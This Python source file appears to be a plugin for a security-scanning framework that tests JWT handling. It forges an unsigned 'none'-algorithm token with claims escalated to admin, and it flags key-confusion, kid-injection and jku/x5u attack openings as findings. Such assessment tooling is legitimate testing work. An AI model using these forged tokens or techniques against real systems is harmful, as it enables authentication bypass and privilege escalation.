"""Advanced JWT attacks — none alg, key confusion, kid injection, jku/x5u."""

from __future__ import annotations

import base64
import json
import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)


def decode_jwt_part(part: str) -> dict:
    """Decode a JWT base64url part."""
    padding = 4 - len(part) % 4
    if padding < 4:
        part += "=" * padding
    return json.loads(base64.urlsafe_b64decode(part))


def encode_jwt_part(data: dict) -> str:
    """Encode a dict as JWT base64url part."""
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


class JwtForgePlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="jwt_forge",
        display_name="Advanced JWT Attacks",
        category=PluginCategory.CRYPTO,
        description="JWT none alg, key confusion RS→HS, kid injection, jku/x5u abuse",
        produces=["forged_token"],
        timeout=60.0,
        requires_http=False,
        risk_level="safe",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"attacks": [], "forged_tokens": []}

        jwt_token = target.meta.get("jwt_token", "")
        if not jwt_token:
            findings.append(Finding.info(
                "No JWT token provided (set target.meta jwt_token)",
                tags=["crypto", "jwt"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        parts = jwt_token.split(".")
        if len(parts) != 3:
            findings.append(Finding.info(
                "Invalid JWT format", tags=["crypto", "jwt"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        try:
            header = decode_jwt_part(parts[0])
            payload = decode_jwt_part(parts[1])
        except Exception as exc:
            findings.append(Finding.info(
                f"JWT decode error: {exc}", tags=["crypto", "jwt"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        findings.append(Finding.info(
            f"JWT algorithm: {header.get('alg', '?')}",
            evidence=f"Header: {json.dumps(header)}\nPayload: {json.dumps(payload)}",
            tags=["crypto", "jwt"],
        ))

        # Attack 1: None algorithm
        none_header = {**header, "alg": "none"}
        admin_payload = {**payload}
        # Try common privilege escalation modifications
        for field in ("admin", "is_admin", "role"):
            if field in admin_payload:
                if field == "role":
                    admin_payload[field] = "admin"
                else:
                    admin_payload[field] = True
        if "sub" in admin_payload:
            admin_payload["sub"] = "admin"

        none_token = f"{encode_jwt_part(none_header)}.{encode_jwt_part(admin_payload)}."
        data["forged_tokens"].append({"attack": "none_alg", "token": none_token})
        data["attacks"].append("none_alg")

        findings.append(Finding.high(
            "JWT 'none' algorithm token forged",
            evidence=f"Token: {none_token[:100]}...",
            description="If server accepts alg:none, any claim can be modified",
            tags=["crypto", "jwt", "none-alg"],
        ))

        # Attack 2: Key confusion (RS256 → HS256)
        if header.get("alg", "").startswith("RS"):
            data["attacks"].append("key_confusion")
            findings.append(Finding.high(
                "JWT RS→HS key confusion possible",
                evidence=f"Original: {header.get('alg')}, Attack: HS256",
                description=(
                    "If the server uses the RSA public key to verify HS256, "
                    "sign with the public key to forge any token"
                ),
                tags=["crypto", "jwt", "key-confusion"],
            ))

        # Attack 3: kid injection
        if "kid" in header:
            data["attacks"].append("kid_injection")
            findings.append(Finding.high(
                "JWT kid parameter — injection possible",
                evidence=f"Original kid: {header['kid']}",
                description=(
                    "kid field may be injectable: "
                    "SQLi to control the key, path traversal to use /dev/null"
                ),
                tags=["crypto", "jwt", "kid"],
            ))

        # Attack 4: jku/x5u abuse
        if "jku" in header or "x5u" in header:
            data["attacks"].append("jku_abuse")
            findings.append(Finding.high(
                f"JWT {'jku' if 'jku' in header else 'x5u'} header present",
                evidence=f"URL: {header.get('jku', header.get('x5u', ''))}",
                description="Point jku/x5u to attacker-controlled JWKS to forge tokens",
                tags=["crypto", "jwt", "jku"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
